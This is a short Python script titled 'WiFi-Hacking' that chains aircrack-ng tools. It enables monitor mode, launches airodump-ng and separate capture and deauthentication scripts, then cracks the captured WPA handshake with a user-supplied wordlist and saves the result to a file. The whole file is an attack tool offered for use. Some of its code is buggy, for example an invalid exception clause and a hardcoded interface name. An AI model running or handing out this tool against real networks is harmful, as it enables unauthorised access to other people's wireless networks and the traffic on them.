#!/usr/bin/python3.7

from __future__ import unicode_literals
import os
from termcolor import colored
import pyfiglet
from time import sleep
from prompt_toolkit import prompt


def start():

	font = colored(pyfiglet.figlet_format("WiFi-Hacking",font='slant'),'red', attrs=['bold'])
	print (font)
	return(" " )

def mon():
	print(colored('Enter the Interface >> ','blue',attrs=['bold']))
	interface =prompt()
	mon0 = 'airmon-ng check kill && airmon-ng && airmon-ng start {0} && airmon-ng'.format(interface)
	os.system(mon0)
	
	airodump = 'airodump-ng {0}'.format(interface +'mon')
	os.system(airodump)
	interface2= interface +'mon'
	
	print( colored("Airodump will start, in a new terminal", "magenta"))
	print (colored("Aireplay will start, in a new terminal", "magenta"))
	sleep(5)
	pwd = os.getcwd()
	hi = 'xfce4-terminal --hold -e "$pwd ./dump.py" & xfce4-terminal --hold -e "$pwd ./deauth.py"'
	os.system(hi)
	
	
	print( colored("Handshake is captured",attrs=['bold']))
	print (colored("Cracking the handshake with aircrack-ng is starting.......", "yellow"))
	sleep(5)	
	
	print(colored('Specify the path to your wordlist dictionary: ','blue',attrs=['bold']))
	wordlist = prompt()
	print(colored('Enter the path of the cap file [e.g: 01.cap] : ','blue',attrs=['bold']))
	save = prompt()
	print (colored("This could take a while according to the wordlist you are using, so be patient!", "red"))
	crack = "aircrack-ng -w {0} {1} | tee /root/Documents/p/file1.txt ".format(wordlist,save)
	os.system(crack)
	sleep(15)
	try:
		input(colored("\nPress Enter To Continue.....",'yellow',attrs=['blink']))

	except e:
		print(colored('\n [','blue') + colored('+','red') + colored('] Bringing the interface to normal mode & exicting','blue', attrs = ['bold']))

		os.system('airmon-ng stop wlan0mon')
		os.system('service network-manager start')
		sleep(15)
		os.system('clear')
		pass

try:
	print(colored(start(),attrs=['bold']))
	mon()

except :
	os.system('clear')
	quit("")

	
